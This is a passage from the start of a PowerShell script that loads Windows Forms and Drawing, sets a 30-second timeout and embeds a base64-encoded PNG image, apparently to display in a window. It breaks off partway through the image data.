Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Timeout = 30 # seconds
$base64Image = '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